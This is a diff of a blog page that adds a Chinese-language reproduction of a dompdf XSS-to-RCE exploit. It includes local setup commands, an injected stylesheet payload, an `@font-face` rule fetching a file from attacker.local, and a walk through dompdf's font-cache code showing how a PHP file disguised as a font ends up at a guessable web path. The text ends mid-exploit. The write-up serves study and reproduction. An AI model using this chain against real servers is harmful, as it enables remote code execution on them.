@@ -7,38 +7,38 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
-    <title>Rce Pdf - DELETE</title><meta name="Description" content=""><meta property="og:title" content="Rce Pdf" />
+    <title>从XSS到 RCE (dompdf 0day) - Delete&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="从XSS到 RCE (dompdf 0day)" />
 <meta property="og:description" content="" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://ML-hacker.github.io/posts/rce-pdf/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2024-02-06T14:36:09+08:00" />
-<meta property="article:modified_time" content="2024-02-06T14:36:09+08:00" />
+<meta property="article:published_time" content="2023-09-13T10:51:49+08:00" />
+<meta property="article:modified_time" content="2023-09-13T10:51:49+08:00" />
 
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Rce Pdf"/>
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="从XSS到 RCE (dompdf 0day)"/>
 <meta name="twitter:description" content=""/>
-<meta name="application-name" content="DELETE">
-<meta name="apple-mobile-web-app-title" content="DELETE">
+<meta name="application-name" content="Delete&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Delete&#39;s blog">
 
 <meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/rce-pdf/" /><link rel="prev" href="http://ML-hacker.github.io/posts/php-parameter/" /><link rel="next" href="http://ML-hacker.github.io/posts/sictf/" />
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/rce-pdf/" /><link rel="prev" href="http://ML-hacker.github.io/posts/sictf/" /><link rel="next" href="http://ML-hacker.github.io/posts/lolita-n1/" />
 <link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
         <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
         <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
-        "headline": "Rce Pdf",
+        "headline": "从XSS到 RCE (dompdf 0day)",
         "inLanguage": "en",
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http://ML-hacker.github.io/posts/rce-pdf/"
-        },"genre": "posts","wordcount":  0 ,
-        "url": "http://ML-hacker.github.io/posts/rce-pdf/","datePublished": "2024-02-06T14:36:09+08:00","dateModified": "2024-02-06T14:36:09+08:00","publisher": {
+        },"genre": "posts","keywords": "复现","wordcount":  562 ,
+        "url": "http://ML-hacker.github.io/posts/rce-pdf/","datePublished": "2023-09-13T10:51:49+08:00","dateModified": "2023-09-13T10:51:49+08:00","publisher": {
             "@type": "Organization",
-            "name": "Author"},"author": {
+            "name": "Delete"},"author": {
                 "@type": "Person",
-                "name": "Author"
+                "name": "Delete"
             },"description": ""
     }
     </script></head>
@@ -56,10 +56,21 @@
     <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
         <div class="header-title">
-            <a href="/" title="DELETE"><span id="desktop-header-typeit" class="typeit"></span></a>
+            <a href="/" title="Delete&#39;s blog"><span id="desktop-header-typeit" class="typeit"></span></a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/friend"> Friend </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                     <i class="fas fa-adjust fa-fw"></i>
                     <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
                         <option value="light">Light</option>
@@ -74,13 +85,29 @@
     <div class="header-container">
         <div class="header-wrapper">
             <div class="header-title">
-                <a href="/" title="DELETE"><span id="mobile-header-typeit" class="typeit"></span></a>
+                <a href="/" title="Delete&#39;s blog"><span id="mobile-header-typeit" class="typeit"></span></a>
             </div>
             <div class="menu-toggle" id="menu-toggle-mobile">
                 <span></span><span></span><span></span>
             </div>
         </div>
-        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/friend" title="">Friend</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                 <i class="fas fa-adjust fa-fw"></i>
                 <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
                     <option value="light">Light</option>
@@ -98,18 +125,334 @@
     <div id="search-dropdown-mobile"></div>
 </div>
 <main class="main">
-            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Rce Pdf</h1><div class="post-meta">
+            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">从XSS到 RCE (dompdf 0day)</h1><div class="post-meta">
             <div class="post-meta-line">
-                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Author</a>
-                </span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-02-06">2024-02-06</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-02-06">2024-02-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;0 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;0 minutes&nbsp;</div>
-        </div><div class="content" id="content"></div>
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/ML-hacker" title="Author" target="_blank" rel="noopener noreferrer author" class="author">Delete</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>WEB</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-09-13">2023-09-13</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-09-13">2023-09-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;562 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="content" id="content"><h1 id="从xss到-rce-dompdf-0day" class="headerLink">
+    <a href="#%e4%bb%8exss%e5%88%b0-rce-dompdf-0day" class="header-mark"></a>从XSS到 RCE (dompdf 0day)</h1><p>首先进入：https://github.com/positive-security/dompdf-rce
+下载必要的源码</p>
+<p>复现系统：kali 2022.1</p>
+<p>话不多说直接开始：
+配置环境：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd application //
+</span></span><span class="line"><span class="cl">php -S localhost:9000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd expliot
+</span></span><span class="line"><span class="cl">php -S localhost:9001
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/rce-pdf/1.png"
+        srcset="/img/rce-pdf/1.png, /img/rce-pdf/1.png 1.5x, /img/rce-pdf/1.png 2x"
+        alt="/img/rce-pdf/1.png"
+        title="/img/rce-pdf/1.png" ></figure>
+正常访问
+发现：
+<figure><img
+        
+        loading="lazy"
+        src="/img/rce-pdf/2.png"
+        srcset="/img/rce-pdf/2.png, /img/rce-pdf/2.png 1.5x, /img/rce-pdf/2.png 2x"
+        alt="/img/rce-pdf/2.png"
+        title="/img/rce-pdf/2.png" ></figure>
+我们加入title的时候会改变上面的回显
+尝试xss
+<figure><img
+        
+        loading="lazy"
+        src="/img/rce-pdf/3.png"
+        srcset="/img/rce-pdf/3.png, /img/rce-pdf/3.png 1.5x, /img/rce-pdf/3.png 2x"
+        alt="/img/rce-pdf/3.png"
+        title="/img/rce-pdf/3.png" ></figure>
+发现可以
+鉴于该站点没有在客户端的浏览器中存储任何敏感信息（例如身份验证 cookie），这本身就是一个低严重性的发现。</p>
+<p>然后我们输入playload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/rce-pdf/4.png"
+        srcset="/img/rce-pdf/4.png, /img/rce-pdf/4.png 1.5x, /img/rce-pdf/4.png 2x"
+        alt="/img/rce-pdf/4.png"
+        title="/img/rce-pdf/4.png" ></figure>
+发现rce成功！</p>
+<h1 id="分析漏洞点" class="headerLink">
+    <a href="#%e5%88%86%e6%9e%90%e6%bc%8f%e6%b4%9e%e7%82%b9" class="header-mark"></a>分析漏洞点：</h1><p>此时，我们将注意力转移到<a href="https://github.com/dompdf/dompdf" target="_blank" rel="noopener noreferrer">dompdf 的源代码</a>上，看看我们是否能够找到可以让我们进一步访问服务器的漏洞。</p>
+<p>首先是两个配置：</p>
+<p>在 PDF 渲染期间执行嵌入式 PHP，之后的被禁用了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">* Enable embedded PHP
+</span></span></span><span class="line"><span class="cl"><span class="cm">*
+</span></span></span><span class="line"><span class="cl"><span class="cm">* If this setting is set to true then DOMPDF will automatically evaluate
+</span></span></span><span class="line"><span class="cl"><span class="cm">* embedded PHP contained within  ...  tags.
+</span></span></span><span class="line"><span class="cl"><span class="cm">*
+</span></span></span><span class="line"><span class="cl"><span class="cm">* ==== IMPORTANT ====
+</span></span></span><span class="line"><span class="cl"><span class="cm">* Enabling this for documents you do not trust (e.g. arbitrary remote html
+</span></span></span><span class="line"><span class="cl"><span class="cm">* pages) is a security risk. Embedded scripts are run with the same level of
+</span></span></span><span class="line"><span class="cl"><span class="cm">* system access available to dompdf. Set this option to false (recommended)
+</span></span></span><span class="line"><span class="cl"><span class="cm">* if you wish to process untrusted documents.
+</span></span></span><span class="line"><span class="cl"><span class="cm">*
+</span></span></span><span class="line"><span class="cl"><span class="cm">* This setting may increase the risk of system exploit. Do not change
+</span></span></span><span class="line"><span class="cl"><span class="cm">* this settings without understanding the consequences. Additional
+</span></span></span><span class="line"><span class="cl"><span class="cm">* documentation is available on the dompdf wiki at:
+</span></span></span><span class="line"><span class="cl"><span class="cm">*
+</span></span></span><span class="line"><span class="cl"><span class="cm">*
+</span></span></span><span class="line"><span class="cl"><span class="cm">* @var bool
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl"><span class="kr">private</span> <span class="nx">$isPhpEnabled</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>远程资源加载：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">* Enable remote file access
+</span></span></span><span class="line"><span class="cl"><span class="cm">*
+</span></span></span><span class="line"><span class="cl"><span class="cm">* If this setting is set to true, DOMPDF will access remote sites for
+</span></span></span><span class="line"><span class="cl"><span class="cm">* images and CSS files as required.
+</span></span></span><span class="line"><span class="cl"><span class="cm">*
+</span></span></span><span class="line"><span class="cl"><span class="cm">* ==== IMPORTANT ====
+</span></span></span><span class="line"><span class="cl"><span class="cm">* This can be a security risk, in particular in combination with isPhpEnabled and
+</span></span></span><span class="line"><span class="cl"><span class="cm">* allowing remote html code to be passed to $dompdf = new DOMPDF(); $dompdf-&gt;load_html(...);
+</span></span></span><span class="line"><span class="cl"><span class="cm">* This allows anonymous users to download legally doubtful internet content which on
+</span></span></span><span class="line"><span class="cl"><span class="cm">* tracing back appears to being downloaded by your server, or allows malicious php code
+</span></span></span><span class="line"><span class="cl"><span class="cm">* in remote html pages to be executed by your server with your account privileges.
+</span></span></span><span class="line"><span class="cl"><span class="cm">*
+</span></span></span><span class="line"><span class="cl"><span class="cm">* This setting may increase the risk of system exploit. Do not change
+</span></span></span><span class="line"><span class="cl"><span class="cm">* this settings without understanding the consequences. Additional
+</span></span></span><span class="line"><span class="cl"><span class="cm">* documentation is available on the dompdf wiki at:
+</span></span></span><span class="line"><span class="cl"><span class="cm">*
+</span></span></span><span class="line"><span class="cl"><span class="cm">*
+</span></span></span><span class="line"><span class="cl"><span class="cm">* @var bool
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl"><span class="kr">private</span> <span class="nx">$isRemoteEnabled</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后我们可以测试是否这个功能开启
+利用xss构造语句：<code>?t=aa&lt;link rel=stylesheet href=&quot;xxxxxxx/test.css&quot;&gt;&amp;pdf</code></p>
+<p>设置时<code>$isRemoteEnabled</code>（或版本 ≤ 0.8.5，无论此设置如何），dompdf 允许通过 font-face CSS 规则加载自定义字体，如下所示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="p">@</span><span class="k">font-face</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">font-family</span><span class="o">:</span><span class="s1">&#39;TestFont&#39;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">src</span><span class="p">:</span><span class="nd">url</span><span class="o">(</span><span class="s1">&#39;http://attacker.local/test_font.ttf&#39;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">font-weight</span><span class="o">:</span><span class="s1">&#39;normal&#39;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">font-style</span><span class="o">:</span><span class="s1">&#39;normal&#39;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当使用外部字体时，dompdf 将其缓存在本地<code>/lib/fonts</code>子目录中，并在<code>dompdf_font_family_cache.php</code>using中添加相应的条目<a href="https://github.com/dompdf/dompdf/blob/v1.1.1/src/FontMetrics.php#L83-L110" target="_blank" rel="noopener noreferrer"><code>saveFontFamilies()</code></a>。此函数将 dompdf 已知的字体编码为 PHP 数组，以及稍后查找它们所需的信息。</p>
+<p>从我们在系统其他地方找到的日志文件中，我们已经怀疑 dompdf 存储在可从 web-root 访问的目录中，实际上在尝试访问字体缓存索引时缺少错误消息似乎表明相同：</p>
+<h2 id="下一步字体缓存" class="headerLink">
+    <a href="#%e4%b8%8b%e4%b8%80%e6%ad%a5%e5%ad%97%e4%bd%93%e7%bc%93%e5%ad%98" class="header-mark"></a>下一步：字体缓存</h2><p>如果我们不能使用字体缓存索引……我们可以直接使用字体缓存吗？
+看下dompdf如何如何注册新字体(部分，具体在<a href="https://github.com/dompdf/dompdf/blob/v1.2.0/src/FontMetrics.php#L174" target="_blank" rel="noopener noreferrer">这里</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="sd">/**  
+</span></span></span><span class="line"><span class="cl"><span class="sd">* @param array $style  
+</span></span></span><span class="line"><span class="cl"><span class="sd">* @param string $remoteFile  
+</span></span></span><span class="line"><span class="cl"><span class="sd">* @param resource $context  
+</span></span></span><span class="line"><span class="cl"><span class="sd">* @return bool  
+</span></span></span><span class="line"><span class="cl"><span class="sd">*/</span>  
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">registerFont</span><span class="p">(</span><span class="nv">$style</span><span class="p">,</span> <span class="nv">$remoteFile</span><span class="p">,</span> <span class="nv">$context</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>  
+</span></span><span class="line"><span class="cl"> <span class="nv">$fontname</span> <span class="o">=</span> <span class="nx">mb_strtolower</span><span class="p">(</span><span class="nv">$style</span><span class="p">[</span><span class="s2">&#34;family&#34;</span><span class="p">]);</span>  
+</span></span><span class="line"><span class="cl"> <span class="nv">$styleString</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getType</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">{</span><span class="nv">$style</span><span class="p">[</span><span class="s1">&#39;weight&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="nv">$style</span><span class="p">[</span><span class="s1">&#39;style&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="nv">$fontDir</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="o">-&gt;</span><span class="na">getFontDir</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl"> <span class="nv">$remoteHash</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$remoteFile</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="nv">$prefix</span> <span class="o">=</span> <span class="nv">$fontname</span> <span class="o">.</span> <span class="s2">&#34;_&#34;</span> <span class="o">.</span> <span class="nv">$styleString</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"> <span class="nv">$prefix</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;[</span><span class="se">\\</span><span class="s2">W]&#34;</span><span class="p">,</span> <span class="s2">&#34;_&#34;</span><span class="p">,</span> <span class="nv">$prefix</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"> <span class="nv">$prefix</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[^-_</span><span class="se">\\</span><span class="s2">w]+/&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$prefix</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="nv">$localFile</span> <span class="o">=</span> <span class="nv">$fontDir</span> <span class="o">.</span> <span class="s2">&#34;/&#34;</span> <span class="o">.</span> <span class="nv">$prefix</span> <span class="o">.</span> <span class="s2">&#34;_&#34;</span> <span class="o">.</span> <span class="nv">$remoteHash</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"> <span class="nv">$localFile</span> <span class="o">.=</span> <span class="s2">&#34;.&#34;</span><span class="o">.</span><span class="nx">strtolower</span><span class="p">(</span><span class="nx">pathinfo</span><span class="p">(</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$remoteFile</span><span class="p">,</span> <span class="nx">PHP_URL_PATH</span><span class="p">),</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">));</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="c1">// Download the remote file  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="k">list</span><span class="p">(</span><span class="nv">$remoteFileContent</span><span class="p">,</span> <span class="nv">$http_response_header</span><span class="p">)</span> <span class="o">=</span> <span class="o">@</span><span class="nx">Helpers</span><span class="o">::</span><span class="na">getFileContent</span><span class="p">(</span><span class="nv">$remoteFile</span><span class="p">,</span> <span class="nv">$context</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="nv">$localTempFile</span> <span class="o">=</span> <span class="o">@</span><span class="nx">tempnam</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s2">&#34;tempDir&#34;</span><span class="p">),</span> <span class="s2">&#34;dompdf-font-&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"> <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$localTempFile</span><span class="p">,</span> <span class="nv">$remoteFileContent</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="nv">$font</span> <span class="o">=</span> <span class="nx">Font</span><span class="o">::</span><span class="na">load</span><span class="p">(</span><span class="nv">$localTempFile</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$font</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"> <span class="nx">unlink</span><span class="p">(</span><span class="nv">$localTempFile</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="nv">$font</span><span class="o">-&gt;</span><span class="na">parse</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl"> <span class="nv">$font</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="nx">unlink</span><span class="p">(</span><span class="nv">$localTempFile</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="c1">// Save the changes  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$localFile</span><span class="p">,</span> <span class="nv">$remoteFileContent</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">saveFontFamilies</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="k">true</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到，新缓存字体的名字是确定了的，<strong>字体名称</strong>，**样式,MD5(RemoteURL)**这三个组成，比如，url是这样:<code>http://attacker.local/test_font.ttf</code>样式为normal，那么将被存为：<code>testfont_normal_d249c21fbbb1302ab53282354d462d9e.ttf</code></p>
+<p>那么这样的话，即使没有目录遍历的洞，也可以不用爆破直接知道文件名。</p>
+<p>但是源码有个问题，他判断字体文件是否正常，是基于上传文件的文件头，类似Linux的判断方式，而不管文件后缀，那么即使使用其他后缀，只要符合<code>ttf</code>的文件头标准，仍可被解析。</p>
+<p>下面是构造的<code>css</code>以及<code>ttf(php)</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">@</span><span class="nx">font</span><span class="o">-</span><span class="nx">face</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"> <span class="nx">font</span><span class="o">-</span><span class="nx">family</span><span class="o">:</span><span class="s1">&#39;exploitfont&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"> <span class="nx">src</span><span class="o">:</span><span class="nx">url</span><span class="p">(</span><span class="s1">&#39;http://localhost:9001/exploit_font.php&#39;</span><span class="p">);</span>  
